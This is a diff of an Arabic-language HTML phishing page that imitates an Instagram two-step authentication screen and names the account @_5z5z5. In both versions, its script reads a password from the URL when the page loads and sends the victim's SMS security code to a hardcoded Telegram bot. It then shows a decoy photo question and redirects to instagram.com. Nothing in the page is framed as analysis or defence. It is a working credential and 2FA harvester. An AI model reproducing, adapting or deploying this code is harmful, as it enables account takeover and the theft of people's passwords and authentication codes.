@@ -5,74 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تأمين الحساب | Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; color: #262626; }
+        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
         .top-bar { width: 100%; padding: 15px 0; border-bottom: 1px solid #dbdbdb; text-align: center; font-weight: bold; background: #fafafa; font-size: 14px; }
         .container { width: 100%; max-width: 350px; text-align: center; padding: 25px 20px; }
         .logo { width: 150px; margin-bottom: 20px; }
-        .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .btn-blue { width: 100%; background: #0095f6; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; margin-top: 10px; }
-        .btn-light { width: 48%; padding: 12px; border-radius: 8px; border: 1px solid #dbdbdb; background: #fff; cursor: pointer; font-weight: bold; }
-        input { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 18px; text-align: center; letter-spacing: 3px; }
+        .profile-img { width: 100%; border-radius: 12px; margin: 15px 0; border: 1px solid #dbdbdb; }
+        .btn-blue { width: 100%; background: #0095f6; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        input { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin-bottom: 15px; box-sizing: border-box; font-size: 18px; text-align: center; }
         #step-photo { display: none; }
     </style>
 </head>
 <body onload="capturePassword()">
     <div class="top-bar">المصادقة بخطوتين</div>
-
-    <!-- الجزء الأول: استلام رمز الـ SMS -->
     <div class="container" id="step-sms">
         <img src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Logo.wine.svg" class="logo">
         <h3 style="font-size: 18px;">أدخل رمز الأمان</h3>
-        <p style="font-size: 14px; color: #8e8e8e; line-height: 1.6;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>. يرجى إدخاله للمتابعة.</p>
+        <p style="font-size: 14px; color: #8e8e8e;">لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>.</p>
         <input type="text" id="sms" placeholder="000000" maxlength="6">
         <button class="btn-blue" onclick="sendSMS()">تأكيد الرمز</button>
     </div>
-
-    <!-- الجزء الثاني: مراجعة الصورة (يظهر بعد الرمز) -->
     <div class="container" id="step-photo">
         <h3 style="font-size: 18px;">مراجعة سجلات الحساب</h3>
-        <p style="font-size: 13px; color: #8e8e8e;">بناءً على نشاط الحساب الأخير، هل قمت بحذف هذه الصورة مؤخراً؟</p>
+        <p style="font-size: 13px; color: #8e8e8e;">هل قمت بحذف هذه الصورة مؤخراً؟</p>
         <img src="IMG_1145.jpeg" class="profile-img">
-        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
-            <button class="btn-light" onclick="finish()">نعم</button>
-            <button class="btn-light" onclick="finish()">لا</button>
-        </div>
+        <div style="display: flex; gap: 10px;"><button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">نعم</button><button class="btn-blue" onclick="finish()" style="background:#efefef; color:#262626;">لا</button></div>
     </div>
-
     <script>
         const botToken = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
         const chatId = "897618292";
-
-        // 1. وظيفة سحب الباسورد فور تحميل الصفحة
         function capturePassword() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const password = urlParams.get('pass');
-            if (password && password.trim() !== "") {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 كلمة المرور المستلمة من الإيميل: " + password)}`);
-            }
+            const pass = new URLSearchParams(window.location.search).get('pass');
+            if (pass) fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=🔑 الباسورد: ${pass}`);
         }
-
-        // 2. وظيفة إرسال الرمز والانتقال لصورة القطة
         function sendSMS() {
             const sms = document.getElementById('sms').value;
-            if(sms.length < 6) { 
-                alert("يرجى إدخال الرمز المكون من 6 أرقام"); 
-                return; 
-            }
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📲 رمز المصادقة الثنائية (SMS): " + sms)}`);
-
-            // التبديل بين الواجهات
-            document.getElementById('step-sms').style.display = 'none';
-            document.getElementById('step-photo').style.display = 'block';
-            document.querySelector('.top-bar').innerText = "مراجعة النشاط";
+            if(sms.length<6) return;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📲 الرمز: ${sms}`);
+            document.getElementById('step-sms').style.display='none';
+            document.getElementById('step-photo').style.display='block';
         }
-
-        // 3. إنهاء العملية والتحويل لإنستجرام
-        function finish() {
-            alert("شكراً لك. تم تأكيد ملكية الحساب وتحديث سجلات الأمان بنجاح.");
-            window.location.href = "https://instagram.com";
-        }
+        function finish() { alert("تم التأمين بنجاح"); window.location.href="https://instagram.com"; }
     </script>
 </body>
 </html>
